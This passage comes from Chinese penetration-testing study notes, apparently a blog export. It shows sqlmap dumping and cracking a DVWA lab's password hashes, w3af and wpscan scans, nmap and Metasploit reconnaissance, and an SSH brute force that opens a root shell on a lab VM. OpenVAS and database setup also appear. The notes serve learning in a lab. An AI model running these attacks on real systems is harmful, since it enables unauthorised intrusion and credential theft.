K in ~ [15:54:32] $ sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&quot; --cookie=&apos;security=low; PHPSESSID=34r306k8id6f2tngn83duu81i5&apos; -D dvwa --tables ... Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ [15:57:12] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/www.dvssc.com&apos; [*] ending @ 15:57:12 /2019-08-08/ 探测字段列表 123456789101112131415161718192021222324252627# root @ K in ~ [15:57:12] $ sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&quot; --cookie=&apos;security=low; PHPSESSID=34r306k8id6f2tngn83duu81i5&apos; -D dvwa --tables -T users --columns...Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+...Database: dvwaTable: users[6 columns]+------------+-------------+| Column | Type |+------------+-------------+| user | varchar(15) || avatar | varchar(70) || first_name | varchar(15) || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+------------+-------------+ [15:59:24] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/www.dvssc.com&apos; [*] ending @ 15:59:24 /2019-08-08/ 有个password字段 看下内容 12345678910111213141516171819202122232425262728293031323334353637# root @ K in ~ [16:01:16] $ sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&quot; --cookie=&apos;security=low; PHPSESSID=34r306k8id6f2tngn83duu81i5&apos; -D dvwa --tables -T users --columns --dump...do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y[16:02:17] [INFO] writing hashes to a temporary file &apos;/tmp/sqlmapfr8J7q20293/sqlmaphashes-n6Os2x.txt&apos; do you want to crack them via a dictionary-based attack? [Y/n/q] y[16:02:24] [INFO] using hash method &apos;md5_generic_passwd&apos;what dictionary do you want to use?[1] default dictionary file &apos;/usr/share/sqlmap/data/txt/wordlist.tx_&apos; (press Enter)[2] custom dictionary file[3] file with list of dictionary files[16:02:27] [INFO] using default dictionarydo you want to use common password suffixes? (slow!) [y/N] y[16:02:31] [INFO] starting dictionary-based cracking (md5_generic_passwd)[16:02:31] [INFO] starting 2 processes [16:02:34] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos; [16:02:34] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; [16:02:35] [INFO] cracked password &apos;admin&apos; for hash &apos;21232f297a57a5a743894a0e4a801fc3&apos; [16:02:38] [INFO] cracked password &apos;password&apos; for hash &apos;5f4dcc3b5aa765d61d8327deb882cf99&apos; [16:02:43] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos; Database: dvwa Table: users[5 entries]+---------+---------+-------------------------------------------------+---------------------------------------------+-----------+------------+| user_id | user | avatar | password | last_name | first_name |+---------+---------+-------------------------------------------------+---------------------------------------------+-----------+------------+| 1 | admin | http://owaspbwa/dvwa/hackable/users/admin.jpg | 21232f297a57a5a743894a0e4a801fc3 (admin) | admin | admin || 2 | gordonb | http://owaspbwa/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon || 3 | 1337 | http://owaspbwa/dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack || 4 | pablo | http://owaspbwa/dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo || 5 | smithy | http://owaspbwa/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob |+---------+---------+-------------------------------------------------+---------------------------------------------+-----------+------------+ [16:02:50] [INFO] table &apos;dvwa.users&apos; dumped to CSV file &apos;/root/.sqlmap/output/www.dvssc.com/dump/dvwa/users.csv&apos; [16:02:50] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/www.dvssc.com&apos; [*] ending @ 16:02:50 /2019-08-08/ 甚至能进行哈希碰撞.得到口令 3. XSS漏洞探测 12345678910111213141516171819202122232425262728293031323334353637# root @ K in ~ [22:07:19] C:1$ &apos;/usr/local/src/w3af/w3af_console&apos; w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; crawl web_spiderw3af/plugins&gt;&gt;&gt; crawl config web_spiderw3af/plugins/crawl/config:web_spider&gt;&gt;&gt; set only_forward Truew3af/plugins/crawl/config:web_spider&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; targetw3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/mutillidae/w3af/config:target&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; output html_filew3af/plugins&gt;&gt;&gt; output config html_filew3af/plugins/output/config:html_file&gt;&gt;&gt; set verbose Truew3af/plugins/output/config:html_file&gt;&gt;&gt; set output_file /root/文档/w3af_results/xss.htmlw3af/plugins/output/config:html_file&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; startNew URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/&quot;New URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/images/coykillericon.png&quot;New URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/index.php&quot;New URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/favicon.ico&quot;New URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/setupreset.php&quot;New URL found by web_spider plugin: &quot;http://www.dvssc.com/mutillidae/redirectandlog.php&quot;Found 6 URLs and 53 different injections points.The URL list is:- http://www.dvssc.com/mutillidae/- http://www.dvssc.com/mutillidae/favicon.ico- http://www.dvssc.com/mutillidae/images/coykillericon.png- http://www.dvssc.com/mutillidae/index.php- http://www.dvssc.com/mutillidae/redirectandlog.php- http://www.dvssc.com/mutillidae/setupreset.php... 结果 3. wpscan 更新 wpscan更新超时报错 扫描 12345678910111213141516171819202122232425262728# root @ K in ~ [23:19:00] C:5$ wpscan --url http://www.dvssc.com/wordpress/ --enumerate vp...[+] URL: http://www.dvssc.com/wordpress/[+] Started: Sat Aug 10 23:22:10 2019Interesting Finding(s):[+] http://www.dvssc.com/wordpress/| Interesting Entries:| - Server: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1| - X-Powered-By: PHP/5.3.2-1ubuntu4.5| Found By: Headers (Passive Detection)| Confidence: 100% [i] The main theme could not be detected.[+] Enumerating Vulnerable Plugins (via Passive Methods)[i] No plugins Found.[+] Finished: Sat Aug 10 23:22:11 2019[+] Requests Done: 1[+] Cached Requests: 31[+] Data Sent: 360 B[+] Data Received: 1008 B[+] Memory used: 160.797 MB[+] Elapsed time: 00:00:01 与书上结果不同没有扫描出插件漏洞]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]5.训练营情报搜集作业]]></title>
    <url>%2F2019%2F08%2F06%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-5-%E8%AE%AD%E7%BB%83%E8%90%A5%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86%E4%BD%9C%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[情报搜集作业 1) 对 http://www.bilibili.com 的DNS、IP与位置信息查询，找出网站运营者、联系方式、宿主服务器与所在位置等信息，并撰写一些简单的调查报告。 whois nslookup dig 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 # root @ K in ~ [14:37:37] $ whois bilibili.com Domain Name: BILIBILI.COM Registry Domain ID: 133351793_DOMAIN_COM-VRSN Registrar WHOIS Server: grs-whois.hichina.com Registrar URL: http://www.net.cn Updated Date: 2019-01-30T08:10:56Z Creation Date: 2004-10-21T11:37:37Z Registry Expiry Date: 2022-10-21T11:37:37Z Registrar: Alibaba Cloud Computing (Beijing) Co., Ltd. Registrar IANA ID: 420 Registrar Abuse Contact Email: DomainAbuse@service.aliyun.com Registrar Abuse Contact Phone: +86.95187 Domain Status: ok https://icann.org/epp#ok Name Server: NS3.DNSV5.COM Name Server: NS4.DNSV5.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2019-08-06T06:37:32Z &lt;&lt;&lt;# root @ K in ~ [14:37:47] $ nslookup bilibili.comServer: 10.10.10.2Address: 10.10.10.2#53Non-authoritative answer:Name: bilibili.comAddress: 106.75.240.122# root @ K in ~ [14:42:30] $ dig bilibili.com; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; bilibili.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63898;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;bilibili.com. IN A;; ANSWER SECTION:bilibili.com. 5 IN A 106.75.240.122;; Query time: 1 msec;; SERVER: 10.10.10.2#53(10.10.10.2);; WHEN: 二 8月 06 14:42:41 CST 2019;; MSG SIZE rcvd: 46 待做]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]4.情报搜集]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-4-%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[通过情信息搜集工作,确定渗透测试目标范围 通过情报信息搜集,发现渗透目标的安全漏洞与脆弱点,为后续的渗透攻击提供基础 情报搜集技术 1.外围信息搜集 1.1.通过DNS和IP whois 1234567891011121314151617181920212223242526$ whois sina.com Domain Name: SINA.COM Registry Domain ID: 2243615_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.paycenter.com.cn Registrar URL: http://www.xinnet.com Updated Date: 2018-12-20T09:17:25Z Creation Date: 1998-09-16T04:00:00Z Registry Expiry Date: 2021-09-15T04:00:00Z Registrar: Xin Net Technology Corporation Registrar IANA ID: 120 Registrar Abuse Contact Email: supervision@xinnet.com Registrar Abuse Contact Phone: +86.1087127926 Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited Name Server: NS1.SINA.COM Name Server: NS1.SINA.COM.CN Name Server: NS2.SINA.COM Name Server: NS2.SINA.COM.CN Name Server: NS3.SINA.COM Name Server: NS3.SINA.COM.CN Name Server: NS4.SINA.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2019-08-04T07:30:28Z &lt;&lt;&lt;... nslookup 12345678910$ nslookup&gt; set type=A&gt; sina.comServer: 10.10.10.2Address: 10.10.10.2#53Non-authoritative answer:Name: sina.comAddress: 111.0.93.239&gt; exit dig 123456789101112131415161718192021$ dig @8.8.8.8 sina.com; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; @8.8.8.8 sina.com; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 19416;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;sina.com. IN A;; ANSWER SECTION:sina.com. 600 IN A 111.0.93.239;; Query time: 12 msec;; SERVER: 8.8.8.8#53(8.8.8.8);; WHEN: 日 8月 04 15:36:01 CST 2019;; MSG SIZE rcvd: 53 IP地理位置查询 1.站长之家 2.GeoIP2 netcraft信息查询服务 netcraft 反查域名 站长之家同IP网站查询 1.2.搜索引擎 Google Hacking(GHDB) SiteDigger Search Diggity ghh(http://ghh.sourceforge.net/) 2.主机探测与端口扫描 2.1.寻找活跃主机 ping Metasploit的主机发现模块 1234567891011121314msf5 &gt; search scanner/discoveryMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/discovery/arp_sweep normal Yes ARP Sweep Local Network Discovery 1 auxiliary/scanner/discovery/empty_udp normal Yes UDP Empty Prober 2 auxiliary/scanner/discovery/ipv6_multicast_ping normal No IPv6 Link Local/Node Local Ping Discovery 3 auxiliary/scanner/discovery/ipv6_neighbor normal Yes IPv6 Local Neighbor Discovery 4 auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement normal No IPv6 Local Neighbor Discovery Using Router Advertisement 5 auxiliary/scanner/discovery/udp_probe normal Yes UDP Service Prober 6 auxiliary/scanner/discovery/udp_sweep normal Yes UDP Service Sweeper nmap 2.2.操作系统识别 123456789101112131415161718192021222324252627282930msf5 &gt; nmap -O 10.10.10.130[*] exec: nmap -O 10.10.10.130Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 15:59 CSTNmap scan report for service.dvssc.com (10.10.10.130)Host is up (0.00078s latency).Not shown: 985 closed portsPORT STATE SERVICE21/tcp open ftp80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds777/tcp open multiling-http1025/tcp open NFS-or-IIS1026/tcp open LSA-or-nterm1027/tcp open IIS1031/tcp open iad21521/tcp open oracle6002/tcp open X11:27001/tcp open afs3-callback7002/tcp open afs3-prserver8099/tcp open unknownMAC Address: 00:0C:29:68:2B:56 (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hop... 2.3.端口扫描 Metasploit中的端口扫描器 123456789101112131415 msf5 &gt; search portscan Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wordpress_pingback_access normal Yes Wordpress Pingback Locator 1 auxiliary/scanner/natpmp/natpmp_portscan normal Yes NAT-PMP External Port Scanner 2 auxiliary/scanner/portscan/ack normal Yes TCP ACK Firewall Scanner 3 auxiliary/scanner/portscan/ftpbounce normal Yes FTP Bounce Port Scanner 4 auxiliary/scanner/portscan/syn normal Yes TCP SYN Port Scanner 5 auxiliary/scanner/portscan/tcp normal Yes TCP Port Scanner 6 auxiliary/scanner/portscan/xmas normal Yes TCP &quot;XMas&quot; Port Scanner 7 auxiliary/scanner/sap/sap_router_portscanner normal No SAPRouter Port Scanner nmap 2.4.探测结果分析 结果分析 3.服务扫描与查点 3.1网络服务扫描 Telnet扫描 辅助模块:auxiliary/scanner/telnet/telnet_version SSH扫描 辅助模块:auxiliary/scanner/ssh/ssh_version Oracle数据库服务查点 辅助模块:auxiliary/scanner/oracle/tnslsnr_version 代理 辅助模块:auxiliary/scanner/http/open_proxy 3.2口令猜测与嗅探 SSH服务口令猜测 1234567891011121314151617181920212223242526272829303132333435363738msf5 &gt; use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &gt; show optionsModule options (auxiliary/scanner/ssh/ssh_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD ubnutu no A specific password to authenticate with PASS_FILE /root/ubuntu.txt no File containing passwords, one per line RHOSTS 10.10.10.254 yes The target address range or CIDR identifier RPORT 22 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 50 yes The number of concurrent threads USERNAME root no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE false yes Whether to print output for all attemptsmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.254RHOSTS =&gt; 10.10.10.254msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME rootUSERNAME =&gt; rootmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/ubuntu.txtPASS_FILE =&gt; /root/ubuntu.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 50THREADS =&gt; 50msf5 auxiliary(scanner/ssh/ssh_login) &gt; run[+] 10.10.10.254:22 - Success: &apos;root:ubuntu&apos; &apos;&apos;[*] Command shell session 2 opened (10.10.10.128:42761 -&gt; 10.10.10.254:22) at 2019-08-04 16:25:54 +0800[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 2.psnuffle口令嗅探 辅助模块:auxiliary/sniffer/psnuffle 4.网络漏洞扫描 4.1.安装OpenVAS 安装教程 注意:openvas-check-setup可能会报错 解决方法:按照提示 FIX: Run a CERT synchronization script like openvas-certdata-sync or greenbone-certdata-sync. (特别是加粗的这个脚本.我安装时只提醒我要运行后一个脚本,但运行后仍无效,运行加粗的脚本之后问题解决) 4.2.在Msfconsole中使用OpenVAS 载入openvas 12345678msf5 &gt; load openvas[*] Welcome to OpenVAS integration by kost and averagesecurityguy.[*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect.[*] For additional commands use openvas_help.[*] [*] Successfully loaded plugin: OpenVAS 连接到OpenVAS的管理引擎 123msf5 &gt; openvas_connect admin 你自己设置的密码127.0.0.1 9390 ok[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username admin...[+] OpenVAS connection successful 创建扫描目标 12345678msf5 &gt; openvas_target_create test 10.10.10.254 Metasploitable[*] 5692f7b4-4527-4315-97ea-4ba84a4773c3[+] OpenVAS list of targetsID Name Hosts Max Hosts In Use Comment-- ---- ----- --------- ------ --- ----54f9d83b-17fa-4816-afe8-648172143699 ubuntu1 10.10.10.254 1 1 Metasploitable5692f7b4-4527-4315-97ea-4ba84a4773c3 test 10.10.10.254 1 0 Metasploitable 创建扫描任务 1234567891011121314151617181920212223242526272829303132333435msf5 &gt; openvas_task_create -help[*] Usage: openvas_task_create &lt;name&gt; &lt;comment&gt; &lt;config_id&gt; &lt;target_id&gt;msf5 &gt; openvas_config_list[+] OpenVAS list of configsID Name-- ----085569ce-73ed-11df-83c3-002264764cea empty2d3f051c-55ba-11e3-bf43-406186ea4fc5 Host Discovery698f691e-7489-11df-9d8c-002264764cea Full and fast ultimate708f25c4-7489-11df-8094-002264764cea Full and very deep74db13d6-7489-11df-91b9-002264764cea Full and very deep ultimate8715c877-47a0-438d-98a3-27c7a6ab2196 Discoverybbca7412-a950-11e3-9109-406186ea4fc5 System Discoverydaba56c8-73ec-11df-a475-002264764cea Full and fastmsf5 &gt; openvas_targets_list[-] Unknown command: openvas_targets_list.msf5 &gt; openvas_target_list[+] OpenVAS list of targetsID Name Hosts Max Hosts In Use Comment-- ---- ----- --------- ------ ---- ---54f9d83b-17fa-4816-afe8-648172143699 ubuntu1 10.10.10.254 1 1 Metasploitable5692f7b4-4527-4315-97ea-4ba84a4773c3 test 10.10.10.254 1 0 Metasploitablemsf5 &gt; openvas_task_create test1 &quot;Scan test&quot; daba56c8-73ec-11df-a475-002264764cea 5692f7b4-4527-4315-97ea- 4ba84a4773c3[*] df87292f-9c36-44e0-bb11-fccebc9b6c07[+] OpenVAS list of tasksID Name Comment Status Progress-- ---- ------- ------ --------2659ed72-abab-4c8f-bc15-851c28a718b4 Ubuntu Scan of Ubuntu Metasploitable Done -1df87292f-9c36-44e0-bb11-fccebc9b6c07 test1 Scan test New -1 启动扫描任务 123456789 msf5 &gt; openvas_task_start df87292f-9c36-44e0-bb11-fccebc9b6c07 [*] &lt;X&gt;&lt;authenticate_response status=&apos;200&apos; status_text=&apos;OK&apos;&gt;&lt;role&gt;Admin&lt;/role&gt;&lt;timezone&gt;UTC&lt;/timezone&gt; &lt;severity&gt;nist&lt;/severity&gt;&lt;/authenticate_response&gt;&lt;start_task_response status=&apos;202&apos; status_text=&apos;OK, request submitted&apos;&gt;&lt;report_id&gt;458f32be-7855-4dfc-9968-fb80ad52ee4f&lt;/report_id&gt;&lt;/start_task_response&gt;&lt;/X&gt;msf5 &gt; openvas_task_list[+] OpenVAS list of tasks ID Name Comment Status Progress -- ---- ------- - ----- -------- 2659ed72-abab-4c8f-bc15-851c28a718b4 Ubuntu Scan of Ubuntu Metasploitable Done -1 df87292f-9c36-44e0-bb11-fccebc9b6c07 test1 Scan test Running 1 等待任务完成 下载扫描报告 1msf5 &gt; openvas_report_list 可以在127.0.0.1:9392 查看相关信息 5.渗透测试信息数据库与共享 5.1建立PostgreSQL数据库 启动postgresql服务 1234567# root @ K in ~ [14:46:56] C:1$ service postgresql startP# root @ K in ~ [14:57:50] $ netstat -tnpl | grep postgrestcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN 51073/postgres tcp6 0 0 ::1:5432 :::* LISTEN 51073/postgres 创建用户 123postgres@K:/root$ createuser -P admin为新角色输入的口令: 再输入一遍: 创建数据库 1postgres@K:/root$ createdb --owner=admin metasploit1 连接数据库 123456msf5 &gt; db_connect admin:你自己设置的密码@localhost:5432/metasploit1[-] Connection already established. Only one connection is allowed at a time.[-] Run db_disconnect first if you wish to connect to a different data service.Current connection information:[*] Connected to msf. Connection type: postgresql. 5.2PostgreSQL的作用 1.导入多种扫描器的结果 ** 例1:将nmap结果导入数据库 ** 1234567891011121314msf5 &gt; nmap -Pn -sV -oX dmz 10.10.10.0/24...Nmap done: 256 IP addresses (6 hosts up) scanned in 182.65 secondsmsf5 &gt; db_import /root/dmz[*] Importing &apos;Nmap XML&apos; data[*] Import: Parsing with &apos;Nokogiri v1.10.3&apos;[*] Importing host 10.10.10.1[*] Importing host 10.10.10.2[*] Importing host 10.10.10.129[*] Importing host 10.10.10.130[*] Importing host 10.10.10.254[*] Importing host 10.10.10.128[*] Successfully imported /root/dmz ** 例2.将OpenVAS结果导入数据库 ** 连接数据库和openvas 1234567891011121314151617 msf5 &gt; db_connect admin:你自己设置的密码@localhost:5432/metasploit1 [-] Connection already established. Only one connection is allowed at a time. [-] Run db_disconnect first if you wish to connect to a different data service. Current connection information:[*] Connected to msf. Connection type: postgresql.msf5 &gt; load openvas[*] Welcome to OpenVAS integration by kost and averagesecurityguy.[*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect.[*] For additional commands use openvas_help.[*] [*] Successfully loaded plugin: OpenVASmsf5 &gt; openvas_connect admin 你自己设置的密码 127.0.0.1 9390 ok[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username admin...[+] OpenVAS connection successful 查询报告ID和格式ID 12345678910111213141516171819202122232425262728 msf5 &gt; openvas_report_list [+] OpenVAS list of reports ID Task Name Start Time Stop Time -- --------- ---------- --------- 458f32be-7855-4dfc-9968-fb80ad52ee4f test1 2019-08-04T08:46:59Z 2019-08-04T09:08:00Z d5f9066b-587f-4e0c-b5dc-6bcb4d96dd5a Ubuntu 2019-08-02T12:24:24Z 2019-08-02T12:45:26Z msf5 &gt; openvas_format_list [+] OpenVAS list of report formatsID Name Extension Summary-- ---- --------- -------5057e5cc-b825-11e4-9d0e-28d24461215b Anonymous XML xml Anonymous version of the raw XML report50c9950a-f326-11e4-800c-28d24461215b Verinice ITG vna Greenbone Verinice ITG Report, v1.0.1.5ceff8ba-1f62-11e1-ab9f-406186ea4fc5 CPE csv Common Product Enumeration CSV table.6c248850-1f62-11e1-b082-406186ea4fc5 HTML html Single page HTML report.77bd6c4a-1f62-11e1-abf0-406186ea4fc5 ITG csv German &quot;IT-Grundschutz-Kataloge&quot; report.9087b18c-626c-11e3-8892-406186ea4fc5 CSV Hosts csv CSV host summary.910200ca-dc05-11e1-954f-406186ea4fc5 ARF xml Asset Reporting Format v1.0.0.9ca6fe72-1f62-11e1-9e7c-406186ea4fc5 NBE nbe Legacy OpenVAS report.9e5e5deb-879e-4ecc-8be6-a71cd0875cdd Topology SVG svg Network topology SVG image.a3810a62-1f62-11e1-9219-406186ea4fc5 TXT txt Plain text report.a684c02c-b531-11e1-bdc2-406186ea4fc5 LaTeX tex LaTeX source file.a994b278-1f62-11e1-96ac-406186ea4fc5 XML xml Raw XML report.c15ad349-bd8d-457a-880a-c7056532ee15 Verinice ISM vna Greenbone Verinice ISM Report, v3.0.0.c1645568-627a-11e3-a660-406186ea4fc5 CSV Results csv CSV result list.c402cc3e-b531-11e1-9163-406186ea4fc5 PDF pdf Portable Document Format report. 导出 12msf5 &gt; openvas_report_import d5f9066b-587f-4e0c-b5dc-6bcb4d96dd5a 9ca6fe72-1f62-11e1-9e7c-406186ea4fc5[*] Importing report to database. 查看导入的漏洞信息 123456789 msf5 &gt; vulns Vulnerabilities =============== Timestamp Host Name References --------- ---- ---- ----------2019-07-29 04:45:07 UTC 192.168.81.135 Samba &quot;username map script&quot; Command Execution CVE-2007-2447,OSVDB-34700,BID-23972,URL-http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534,URL-http://samba.org/samba/security/CVE-2007-2447.html... 2.共享数据库 2.1.网络数据库共享 修改postgresql.conf 123456# root @ K in ~ [16:48:43] $ find / -name postgresql.conf/etc/postgresql/11/main/postgresql.conf/usr/lib/tmpfiles.d/postgresql.conf# root @ K in ~ [16:44:21] $ vim /etc/postgresql/11/main/postgresql.conf 将#listen_addresses=&quot;localhost&quot;一行改为 listen_addresses=&quot;*&quot; 修改pg_hba.conf 12# root @ K in ~ [16:45:14] $ vim /etc/postgresql/11/main/pg_hba.conf 在IPv4 local connections一行加入 host all all 10.10.10.1/24 md5 此处的10.10.10.1/24是虚拟机的本地局域网 重启查看 1234567# root @ K in ~ [16:48:36] $ service postgresql restart # root @ K in ~ [16:48:40] $ netstat -tnpl | grep &quot;postgres&quot; tcp 0 0 0.0.0.0:5432 0.0.0.0:* LISTEN 2891/postgres tcp6 0 0 :::5432 :::* LISTEN 2891/postgres 测试 123 msf5 &gt; db_connect admin:你自己设置的密码@10.10.10.128:5432/metasploit1 msf5 &gt; db_status[*] Connected to metasploit1. Connection type: postgresql. Connection name: XD3pnzoq. 2.2.Metasploit RPC服务共享 开启服务 12345 # root @ K in ~ [17:32:48] $ msfrpcd -P 你自己设置的密码 -U admin -a 0.0.0.0[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...[*] MSGRPC backgrounding at 2019-08-05 17:33:43 +0800...[*] MSGRPC background PID 3301 另一台同版本的计算机上连接 1234567# root @ K in ~ [17:47:14] C:127$ msfdb init [i] Database already started[i] The database appears to be already configured, skipping initialization# root @ K in ~ [17:48:00] $ armitage]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]3.渗透测试实验环境]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[为之后的实验做准备 搭建实验环境 所需的虚拟机(百度网盘链接) 配置要求(按魔鬼训练营书上的要求配置,部分配置已经配置完毕.详见参考资料) 参考资料]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]2.对Winxp的渗透攻击]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[初次对Win XP的渗透 ** 基本信息:** Kali: IP:10.10.10.128 Win Xp Home Edition (未开启防火墙) 两者都为虚拟机 渗透过程 1.Nmap扫描本地网络 123456789101112131415msf5 &gt; nmap -sP 10.10.10.0/24[*] exec: nmap -sP 10.10.10.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:55 CSTNmap scan report for 10.10.10.1Host is up (0.00018s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 10.10.10.2Host is up (0.00013s latency).MAC Address: 00:50:56:E0:25:15 (VMware)Nmap scan report for 10.10.10.131Host is up (0.00027s latency).MAC Address: 00:0C:29:85:CA:88 (VMware)...Nmap done: 256 IP addresses (5 hosts up) scanned in 4.13 seconds 其中10.10.10.131为渗透目标 2.搜集目标信息 2.1获取目标的操作系统信息 12345678910111213141516171819[*] exec: nmap -O 10.10.10.131Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:58 CSTNmap scan report for 10.10.10.131Host is up (0.00055s latency).Not shown: 997 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 00:0C:29:85:CA:88 (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds 扫描结果也可能有不正确的地方 但我们能从中得知OS为Win XP SP2 因为我安装的Win 